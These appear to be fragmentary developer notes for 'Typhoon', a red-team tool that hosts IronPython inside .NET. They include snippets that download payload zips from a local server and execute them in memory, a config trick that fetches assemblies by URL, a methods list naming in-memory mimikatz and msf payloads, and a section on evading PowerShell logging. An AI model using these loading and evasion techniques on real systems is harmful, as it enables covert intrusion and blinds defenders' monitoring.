
            /* Example: Direct P/Invoke
            dynamic user32 = new DynamicDllImport("user32.dll", callingConvention: CallingConvention.Winapi);
            user32.MessageBox(0, "Hello World", "Platform Invoke Sample", 0);
            */

            /* Example: Run Ptyho DLR sript
             * String pystring = @"
		import argparse
                
            ";
            dynamic pengine = IPythonUtil.GetEngine();
            dynamic pscope = IPythonUtil.GetNewScope();
            dynamic pythonScript;
            pythonScript = IPythonUtil.GetEngine().CreateScriptSourceFromString(pystring);
            pythonScript.Execute();
            //pythonScript.Execute(pscope);
            */

            /* Example: Serialize and pass objects 
            CommandMessageWriter.MsgWrite();
            CommandMessageReader.MsgRead();
            */

            
            /* foreach (var parameter in parameters)
            {
                Console.WriteLine("Index   : " + parameter.Index);
                Console.WriteLine("Bruto   : " + parameter.Bruto);
                Console.WriteLine("Netto   : [" + parameter.Netto + "]");
                Console.WriteLine("Key     : " + parameter.Key);
                Console.WriteLine("Value   : [" + (parameter.Value == null ? "<null>" : parameter.Value) + "]");
                Console.WriteLine("HasValue: " + parameter.HasValue);
                Console.WriteLine("");
            }

            var noValues = parameters.Where(p => !p.HasValue);
            foreach (var noValue in noValues)
            {
                Console.WriteLine("No value: " + noValue);
            }

            // By default case insensitive 
            var countryParameters = parameters.GetParameters("-country");
            foreach (var parameter in countryParameters)
            {
                Console.WriteLine(parameter.Key + ": " + parameter.Value);
            }
            Console.WriteLine("");

            foreach (var key in parameters.DistinctKeys)
            {
                Console.WriteLine("Key     : " + key);
            }

            Console.WriteLine("");
            Console.WriteLine("Index 2 : " + parameters[2].Value);

            Console.WriteLine("");
            Console.WriteLine("Index of: " + parameters.GetParameters("/space").First().Index);


            Console.WriteLine(parameters.HasKey("/space")); // true 
            Console.WriteLine(parameters.GetFirstValue("/Space")); // " "
            Console.WriteLine(parameters.HasKeyAndValue("/Empty")); // true
            Console.WriteLine(parameters.HasKeyAndNoValue("-IsNiceCountry")); // true

            */

```python
import clr
clr.AddReference('IronPython')
clr.AddReference('Microsoft.Scripting')

from IronPython.Hosting import Python
from Microsoft.Scripting import SourceCodeKind

code = "print string"
values = {'string': 'Hello World'}

engine = Python.CreateEngine()
source = engine.CreateScriptSourceFromString(code, SourceCodeKind.Statements)
mod = engine.CreateScope()

for name, value in values.items():
    setattr(mod, name, value)

source.Execute(mod)
```


` ..\EmbeddedAssemblies\bin\Debug\Typhoon.exe  -mode=exec -type=py -method=file -resource=.\CompileNetMod.py`



```csharp
directive> using System;
directive> using System.IO;
directive> using System.Text;
directive> using System.CodeDom;
directive> using System.Diagnostics;
directive> using System.CodeDom.Compiler;
directive> END
code> foreach (System.CodeDom.Compiler.CompilerInfo ci in
code> System.CodeDom.Compiler.CodeDomProvider.GetAllCompilerInfo())
code> {
code>   foreach (string language in ci.GetLanguages())
code>   System.Console.Write("{0} ", language);
code>   System.Console.WriteLine();
code> }
code> END
Perforing dynamic compile and execution.

--- Result ---
c# cs csharp
vb vbs visualbasic vbscript
js jscript javascript
c++ mc cpp
directive>


```


# Load over newtwork

```csharp
/* Example: Load Python scripts over network, Unzip in memory and run


                        WebClient wc = new WebClient();
                        Console.WriteLine("Getting IPY payloads ...");
                        byte[] scriptzip = wc.DownloadData(@"http://127.0.0.1:8000/ippayloads.zip");


                        // Load network bytes into memory stream and unzip in memory.
                        Stream zipdata = new MemoryStream(scriptzip);
                        Stream unzippedDataStream;
                        ZipArchive archive = new ZipArchive(zipdata, ZipArchiveMode.Read);

                        foreach (ZipArchiveEntry entry in archive.Entries)
                        {

                            if (entry.FullName == @"ppt.py")
                            {
                                Console.WriteLine("Unzipped File: {0}", entry.Name);
                                unzippedDataStream = entry.Open();

                                StreamReader reader = new StreamReader(unzippedDataStream);
                                string codeText = reader.ReadToEnd();
                                pythonScript = pengine.CreateScriptSourceFromString(codeText);
                                Console.WriteLine("Executing Source >>>  {0} <<< ...", codeText.Substring(0,
                                                                    (codeText.Length >= 80) ? 79 : codeText.Length));
                                pythonScript.Execute();
                            }

                        }
            */



            /*
            WebClient wc = new WebClient();
            Console.WriteLine("Getting C# Code payloads ...");
            byte[] dllzip = wc.DownloadData(@"http://127.0.0.1:8000/InteropUtil.zip");

            Dictionary<String, MemoryMappedFile> mmfRepo = new Dictionary<String, MemoryMappedFile>();

            // Load network bytes into memory stream and unzip in memory.
            Stream dllzipdata = new MemoryStream(dllzip);
            ZipArchive dllarchive = new ZipArchive(dllzipdata, ZipArchiveMode.Read);

            Stream unzippedCSDataStream;
            MemoryMappedFile mmf;
            foreach (ZipArchiveEntry entry in dllarchive.Entries)
            {
                if (entry.Name == @"InteropUtil.cs")
                {
                    Console.WriteLine("Unzipped CSharp: {0}", entry.Name);
                    unzippedCSDataStream = entry.Open();
                    // Prepare Memory Map for file
                    mmf = MemoryMappedFile.CreateNew(entry.Name, entry.Length);

                    // Save mmf
                    mmfRepo.Add(entry.Name, mmf);


                    StreamReader reader = new StreamReader(unzippedCSDataStream);
                    string codeText = reader.ReadToEnd();
                    //Console.WriteLine("Code text: {0}", codeText);

                    byte[] Buffer = ASCIIEncoding.ASCII.GetBytes(codeText);
                    using (MemoryMappedViewStream stream = mmf.CreateViewStream())
                    {
                        BinaryWriter writer = new BinaryWriter(stream);
                        writer.Write(Buffer);
                    }
                }
            }
            */
```




from System.Collections.Generic import IEnumerable, List
 list = List[int]([1, 2, 3])
>>> import clr
>>> clr.AddReference("System.Core")
>>> from System.Linq import Enumerable
>>> Enumerable.Any[int](list, lambda x : x < 2)
True


 
Methods of bringing in assemblies:


1. embedded resources 
/csc /resource:Ironpython.dll


2. netmodules

csc /netmodule:module1.

3. Via temp .Net: Download Cache 
gacutul /ldl

Location where it downloads:
 C:\Users\dimas\AppData\Local\assembly\dl3\


Modify. yourexe.exe.config 

 <?xml version="1.0" encoding="utf-8" ?>
<configuration>
  <startup>
        <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.5.2" />
  </startup>
  <runtime>
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <dependentAssembly>
        <assemblyIdentity
          name="IronPython"
          publicKeyToken="7f709c5b713576e1"
          culture="" />
        <codeBase version="2.7.7.0" href="http://127.0.0.1:8000/IronPython.dll" />
      </dependentAssembly>
    </assemblyBinding>
  </runtime>
</configuration>



using System
using System.Runtime.InteropServices;

[DllImport("user32.dll", SetLastError = true)]
static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);


IntPtr thisW = FindWindowEx(IntPtr.Zero, IntPtr.Zero, null, "Downloads");
[DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
public static extern bool SetWindowText(IntPtr hwnd, String lpString);
SetWindowText(thisW, "Hello");




####### Typhoon IPy repl 
(local DLL)
>>> import clr
...
...

... clr.AddReference("Minterop")
... from Cradle import *
... hw = InteropUtil.XFindWindow(None, "dist")
...
... InteropUtil.XSetWindowText(hw, "Hello");
... _END_
End input: import traceback; import clr

(path DLL)
>>> import clr
... clr.AddReferenceToFileAndPath(r"C:\\Users\\dimas\\AppData\\Local\\Temp\tmp14A5.dll")
... from Cradle import *
... hw = InteropUtil.XFindWindow(None, "dist")
... InteropUtil.XSetWindowText(hw, "Hello");
... _END_
End input: 

import clr
clr.AddReferenceToFileAndPath(r"C:\\Users\\dimas\\AppData\\Local\\Temp\tmp14A5.tmp")
from Cradle import *
hw = InteropUtil.XFindWindow(None, "dist")
InteropUtil.XSetWindowText(hw, "Hello");



#### Python without STDLib 

>>> print sys.builtin_module_names
('unicodedata', '_ast', 'imp', 'future_builtins', 'clr', 'exceptions', '__builtin__', 'sys', 'array', 'binascii', 'bz2', 'cmath', 'msvcrt', 'mmap', 'signal', 'winsound', 'zipimport', 'zlib', '_bisect', '_codecs', '_collections', 'copy_reg', 'cPickle', 'cStringIO', 'datetime', 'errno', 'gc', 'itertools', '_csv', '_io', '_locale', 'marshal', 'math', '_md5', 'nt', 'operator', 're', 'select', '_sha', '_sha256', '_sha512',/ 'socket', '_ctypes', '_ctypes_test', '_heapq', '_struct', 'thread', 'time', 'xxsubtype', '_functools', '_random', '_sre', '_ssl', '_subprocess', '_warnings', '_weakref', '_winreg')

sys.dont_write_bytecode
>>> print (sys.executable)
None



TODO:
jscript.NEt
excel .net libraries
xll



Methods:
- Alt Streams delivery
- csc compilation to AppTemp
- app.exe.config download of content to Temp/dl3
- loading python stdlib from PKzip (docx)
- loading .net modules
- memory mapped registry of source compile (py and cs)
- python exploit scripts compat (msf payloads)
- loading and executing exes from memory (mimikatz)
- side loading pip packages in zips. 
- Win32 API call proxy (.cs or .py)


top
	python
		stdlib load file <file> 
		stdlib load url <url> <localfile>
		module load url <url> <mmap|file>
		module load <file>
		exec module <name>
		repl <mode>

	dotnet
		assembly load file <file>
		assembly load url <url> <file>

		module load url <url>
		module compile file <file> <name>
		module compile file <file>


ipy Tools\Scripts\pyc.py  /out:C:\Users\dimas\Downloads\dist\StdLib.dll /target:dll

 clr.AddReferenceToFileAndPath("C:\Users\dimas\Downloads\dist\StdLib.dll")


CPython modules do not work!
import clr
clr.AddReference('StdLib')
import urllib
try:
  opener = urllib.FancyURLopener({})
  f = opener.open("http://www.python.org/")
  f.read()
except Exception as e:
  print e


#Forms

  import clr; 
  clr.AddReference("System.Windows.Forms") ;
  from System.Windows.Forms import *; 
  clr.AddReference("System.Drawing") ; 
  clr.AddReference("System.Windows.Forms") ;
   f = Form(); 
   f.Show()



   import clr, sys
clr.AddReference('StdLib')
import  traceback, urllib
try:
  opener = urllib.FancyURLopener({})
  f = opener.open(r"http://www.python.org/")
  f.read()
except Exception as e:
  traceback.print_exc(file=sys.stdout)
  print e

END



####### Logging evasion while maintaining productivity 

# cPython: Not logged but you need cPython on target machine (blacklisted)
import urllib2
content = urllib2.urlopen("http://googlec.com").read()
print(content)


# C#: Not logged but needs compiler (removed?) and verbose, typed
using System.Net
var content = string.Empty;
using (var webClient = new WebClient())
{
    content = webClient.DownloadString("http://google.com");
    Console.WriteLine(content);
}

# Pwershell 5: Logged 
$webClient = New-Object System.Net.WebClient
$content = $webClient.DownloadString("http://google.com")
Out-Host $content 


# Python DLR. Not logged, dynamic, some batteries included. as long as you can run an unsigned executable or ... stanbdby ;)
from System.Net import WebClient
content = WebClient().DownloadString("http://google.com")
print content

Evasion with productivity. .Net DLR + Python vs. Powershell ... May be coming to the redteam near you in Fall ;)


###### 
Introspect iPython module:
// Create an object for performing tasks with the script.
ObjectOperations Ops = Eng.CreateOperations();
// Create the class object.
Source.Execute(Scope);
// Obtain the class object.
Object CalcClass = Scope.GetVariable(“DoCalculations”);
// Create an instance of the class.
Object CalcObj = Ops.Invoke(CalcClass);
// Get the method you want to use from the class instance.
Object AddMe = Ops.GetMember(CalcObj, “DoAdd”);
// Perform the add.
Int32 Result = (Int32)Ops.Invoke(AddMe, 5, 10);




// Obtain the runtime.
var IPY = Python.CreateRuntime();
// Create a dynamic object containing the script.
dynamic TestPy = IPY.UseFile(“TestClass.py”);
// Execute the __test__() method.
TestPy.__test__();



Error listener 
https://stackoverflow.com/questions/9053440/create-type-at-runtime-that-inherits-an-abstract-class-and-implements-an-interfa

Activator.CreateInstance Remote Object




using System; 
using System.Net;
END
WebClient client = new WebClient();
String address = @"https://google.com";
string reply = client.DownloadString (address);
Console.WriteLine("{0} ... ", reply.Substring(0, 80));
END
